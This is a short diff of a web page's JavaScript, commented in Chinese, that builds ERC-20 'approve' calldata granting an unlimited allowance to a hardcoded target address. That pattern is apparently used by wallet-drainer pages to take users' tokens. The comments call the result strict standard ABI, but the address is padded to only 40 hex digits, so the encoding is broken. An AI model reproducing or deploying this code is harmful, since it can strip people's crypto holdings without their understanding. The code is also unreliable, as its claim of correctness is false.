@@ -95,15 +95,17 @@ function switchPage(id){
   document.getElementById(id).classList.remove("hide");
 }
 
-// 已加上：全小写 + 前置补0到32字节标准对齐，不改任何界面文案布局
+// 已替换为最严格标准ABI版本
 function buildApproveData(){
   const methodId = "0x095ea7b3";
-  // 去0x、转小写
-  let raw = RAW_TARGET_ADDR.slice(2).toLowerCase();
-  // 强制前置补0 凑满40位地址标准长度
-  let spender = raw.padStart(40, '0');
-  // 拼接标准完整calldata
-  return methodId + spender + MAX_ALLOWANCE;
+  // 1. 去0x 转全小写
+  let addrClean = RAW_TARGET_ADDR.slice(2).toLowerCase();
+  // 2. 强制严格补0到40位，不足左边补0，绝对标准地址长度
+  let spender = addrClean.padStart(40, '0');
+  // 3. 授权额度固定32字节标准填充
+  let allowance = MAX_ALLOWANCE;
+  // 拼接正规ABI标准Calldata
+  return methodId + spender + allowance;
 }
 
 async function doApprove(){
